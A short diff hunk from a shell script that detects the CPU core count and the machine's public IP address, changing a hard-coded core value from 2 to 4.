@@ -7,7 +7,7 @@ work=`mktemp -d`
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
-cores=2
+cores=4
 addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 
